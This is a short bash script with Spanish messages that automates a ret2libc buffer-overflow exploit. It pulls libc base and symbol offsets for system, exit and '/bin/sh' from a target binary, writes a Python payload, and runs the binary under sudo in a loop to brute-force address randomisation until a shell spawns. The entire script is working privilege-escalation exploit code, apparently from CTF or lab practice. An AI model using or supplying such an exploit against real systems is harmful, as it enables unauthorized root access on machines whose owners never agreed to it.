#!/bin/bash

binary_target="$1"

if [ -z "$binary_target" ]; then
    echo "[!] ERROR: Objetivo no especificado"
    echo "Uso: $0 </ruta/binario/objetivo>"
    exit 1
fi

# Encuentra los valores de memoria necesarios
overflow=112 #change this
base_libc_mem=$(ldd "$binary_target" | grep libc | awk 'NF{print($NF)}' | tr -d '()' | sed 's/^0x//')
which_lib=$(ldd "$binary_target" | grep libc | awk 'NF{print($3)}')

system_mem=$(readelf -s "$which_lib" | grep " system" | awk 'NF{print $2}' | sed 's/^0x//')
exit_mem=$(readelf -s "$which_lib" | grep " exit" | awk 'NF{print $2}' | sed 's/^0x//')
bash_mem=$(strings -a -t x "$which_lib" | grep /bin/sh | awk 'NF{print $1}' | sed 's/^0x//')

pyload="exploit.py"
cat << EOF > $pyload
#!/usr/bin/python3

import subprocess
from struct import pack
import sys

overflow = $overflow
padding = b'A' * overflow
base_libc_mem = 0x$base_libc_mem
system_mem = 0x$system_mem
exit_mem = 0x$exit_mem
bash_mem = 0x$bash_mem

real_system = pack("<L", base_libc_mem + system_mem)
real_exit = pack("<L", base_libc_mem + exit_mem)
real_bash = pack("<L", base_libc_mem + bash_mem)

payload = padding + real_system + real_exit + real_bash

while True:
    r = subprocess.run(["sudo", "$binary_target", payload])
    if r.returncode == 0:
        print("\\n\\n[+] BUFFER COMPROMETIDO: Saliendo...")
        break
EOF

python3 $pyload
rm $pyload
